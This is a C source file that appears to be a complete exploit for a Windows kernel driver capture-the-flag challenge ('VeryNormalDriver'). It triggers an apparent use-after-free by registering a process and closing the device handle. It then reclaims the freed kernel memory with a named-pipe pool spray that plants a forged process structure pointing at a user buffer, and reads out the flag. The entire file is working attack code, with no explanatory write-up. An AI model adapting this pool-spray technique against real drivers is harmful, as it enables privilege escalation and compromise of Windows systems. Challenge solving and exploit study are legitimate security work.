#include <stdio.h>
#include <Windows.h>
#include <winternl.h>

#include "device.h"

#define EXPLOIT_METADATA_LEN 0x100
#define SPRAY_COUNT 0x700
#define FSCTL_CODE 0x119FF8

#pragma comment(lib, "ntdll.lib")


int RegisterProcess(HANDLE hDevice)
{
    int ret = -1;
    PVND_USER_PROCESS pUserProcess = NULL;
    BOOL success = FALSE;

    pUserProcess = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(VND_USER_PROCESS) + EXPLOIT_METADATA_LEN);

    if (NULL == pUserProcess)

    {
        ret = GetLastError();
        goto done;
    }

    pUserProcess->pSharedMapData = NULL;
    pUserProcess->ulMetadataSize = EXPLOIT_METADATA_LEN;
    pUserProcess->Metadata[0] = 'p';
    pUserProcess->Metadata[1] = 'h';
    pUserProcess->Metadata[2] = 'r';
    pUserProcess->Metadata[3] = 'a';
    pUserProcess->Metadata[4] = 'c';
    pUserProcess->Metadata[5] = 'k';

    success = DeviceIoControl(hDevice, IOCTL_VND_REGISTER_PROCESS, pUserProcess, sizeof(VND_USER_PROCESS) + EXPLOIT_METADATA_LEN, NULL, 0, NULL, NULL);

    if (!success)
    {
        ret = GetLastError();
        goto done;
    }

    ret = 0;

done:
    return ret;
}

int UnregisterProcess(HANDLE hDevice)
{
    int ret = -1;
    BOOL success = FALSE;

    success = DeviceIoControl(hDevice, IOCTL_VND_UNREGISTER_PROCESS, NULL, NULL, NULL, 0, NULL, NULL);

    if (!success)
    {
        ret = GetLastError();
        goto done;
    }

    ret = 0;

done:
    return ret;
}

DWORD PipeSprayOld(PVOID payload, DWORD dwSize, DWORD dwSprayCount, PHANDLE* pphPipeArray, PHANDLE* pphFileArray)
{
    DWORD dwRet = 0;

    IO_STATUS_BLOCK isb;
    OVERLAPPED overlap;

    PHANDLE phPipeArray = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(HANDLE) * dwSprayCount);
    PHANDLE phFileArray = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(HANDLE) * dwSprayCount);

    for (int i = 0; i < dwSprayCount; i++) {
        phPipeArray[i] = CreateNamedPipeW(L"\\\\.\\pipe\\exploitpipe", PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, dwSize, dwSize, 0, 0);

        if (phPipeArray[i] == INVALID_HANDLE_VALUE) {
            wprintf(L"[!] Error while creating the named pipe: %d\n", GetLastError());
            return FALSE;
        }

        memset(&overlap, 0, sizeof(overlap));
        overlap.hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
        if (!overlap.hEvent) {
            wprintf(L"[!] Error creating event: %d\n", GetLastError());
            return FALSE;
        }

        phFileArray[i] = CreateFileW(L"\\\\.\\pipe\\exploitpipe", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);

        if (phFileArray[i] == INVALID_HANDLE_VALUE) {
            wprintf(L"[!] Error while opening the named pipe: %d\n", GetLastError());
            return FALSE;
        }

        NTSTATUS status = NtFsControlFile(phPipeArray[i], 0, 0, 0, &isb, FSCTL_CODE, payload, dwSize, NULL, 0);

        if (status == STATUS_PENDING) {
            DWORD bytesTransferred;
            if (!GetOverlappedResult(phFileArray[i], &overlap, &bytesTransferred, TRUE)) {
                wprintf(L"[!] Overlapped operation failed: %d\n", GetLastError());
                return FALSE;
            }
        }
        else if (status != 0) {
            wprintf(L"[!] Error while calling NtFsControlFile: %p\n", status);
            return FALSE;
        }

        CloseHandle(overlap.hEvent);
    }

    *pphPipeArray = phPipeArray;
    *pphFileArray = phFileArray;

    return dwRet;
}


int LoadFlag(HANDLE hDevice)
{
    int ret = -1;
    BOOL success = FALSE;

    success = DeviceIoControl(hDevice, IOCTL_VND_GET_FLAG, NULL, 0, NULL, 0, NULL, NULL);

    if (!success)
    {
        ret = GetLastError();
        goto done;
    }

    ret = 0;

done:
    return ret;
}

int GetFlag(HANDLE hDevice)
{
    int ret = -1;
    BOOL success = FALSE;

    success = DeviceIoControl(hDevice, IOCTL_VND_UPDATE_PROCESS_MAP, NULL, 0, NULL, 0, NULL, NULL);

    if (!success)
    {
        ret = GetLastError();
        goto done;
    }

    ret = 0;

done:
    return ret;
}

int main(int argc, char** argv)
{
    int ret = 0;
    HANDLE hDevice = INVALID_HANDLE_VALUE;
    PVND_PROCESS pFakeVndProcess = NULL;
    PCHAR pFakeMap = NULL;
    PHANDLE pFileArray = NULL;
    PHANDLE pPipeArray = NULL;
        
    hDevice = CreateFileA("\\\\.\\VeryNormalDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (INVALID_HANDLE_VALUE == hDevice)
    {
        printf("[-] Failed to open device\n");
        goto done;
    }

    ret = RegisterProcess(hDevice);

    if (ret)
    {
        printf("Failed to register process: %0x\n", ret);
        goto done;
    };

    pFakeVndProcess = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (sizeof(VND_PROCESS)  + EXPLOIT_METADATA_LEN));
    pFakeMap = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 4096);

    if ((NULL == pFakeVndProcess) || (NULL == pFakeMap))
    {
        printf("[-] Failed to allocate memory\n");
        goto done;
    }

    CloseHandle(hDevice);

    pFakeVndProcess->Pid = GetCurrentProcessId();
    pFakeVndProcess->bRegistered = TRUE;
    pFakeVndProcess->bIsLeet = TRUE;
    pFakeVndProcess->pSharedMap = pFakeMap;

    PipeSprayOld(pFakeVndProcess, (sizeof(VND_PROCESS) + EXPLOIT_METADATA_LEN), SPRAY_COUNT, &pPipeArray, &pFileArray);

    hDevice = CreateFileA("\\\\.\\VeryNormalDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (INVALID_HANDLE_VALUE == hDevice)
    {
        printf("[-] Failed to open second device\n");
        goto done;
    }

    ret = LoadFlag(hDevice);

    if (ret)
    {
        printf("Failed to load flag: %0x\n", ret);
        goto done;

    }

    ret = GetFlag(hDevice);

    if (ret)
    {
        printf("Failed to get flag: %0x\n", ret);
        goto done;
    }

    printf("Flag is %s\n", pFakeMap);

    for (int i = 0; i < SPRAY_COUNT; i++)
    {
        CloseHandle(pPipeArray[i]);
        CloseHandle(pFileArray[i]);
    }

    printf("closed handles \n");

    pFakeVndProcess->Pid = -1;

    PipeSprayOld(pFakeVndProcess, (sizeof(VND_PROCESS) + EXPLOIT_METADATA_LEN), SPRAY_COUNT, &pPipeArray, &pFileArray);

    printf("sprayed\n");

    CloseHandle(hDevice);

    printf("safe?\n");

done:
    return ret;
}